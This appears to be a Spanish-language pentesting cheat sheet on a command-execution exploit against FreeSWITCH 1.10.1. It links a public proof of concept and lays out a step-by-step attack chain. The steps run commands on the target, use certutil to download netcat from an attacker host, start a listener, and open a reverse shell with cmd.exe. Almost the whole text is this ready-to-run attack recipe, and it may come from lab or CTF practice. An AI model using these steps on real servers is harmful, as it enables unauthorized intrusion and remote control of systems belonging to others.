# Freeswitch-event 

Tags: #Freeswitch 

FreeSWITCH es una plataforma de comunicaciones de software libre y código abierto (bajo Licencia Pública de Mozilla) diseñada para crear, gestionar y escalar aplicaciones de voz, video, mensajería instantánea y multimedia en tiempo real.

## FreeSWITCH 1.10.1 - Command Execution

* [PoC](https://www.exploit-db.com/exploits/47799)

```bash 
# Ejecutar comandos 
❯ python3 freeswitch-exploit.py IP_server whoami
```

```bash 
Paso 1:
# Crear el directorio 'Temp'
❯ python3 freeswitch-exploit.py IP_server "mkdir C:\Temp"

Paso 2:
# Subir netcat 
❯ python3 freeswitch-exploit.py IP_server "certutil.exe -f -urlcache -split http://IP_Kali/nc64.exe C:\Temp\nc64.exe"

Paso 3:
# Mirar que se haya subido 
❯ python3 freeswitch-exploit.py IP_server "dir C:\Temp"

Paso 4:
# Listener en Kali 
❯ rlwrap nc -nlvp 443  

Paso 5:
# Ejecutar la revershell 
❯ python3 freeswitch-exploit.py IP_server "C:\Temp\nc64.exe IP_Kali 443 -e cmd.exe"
```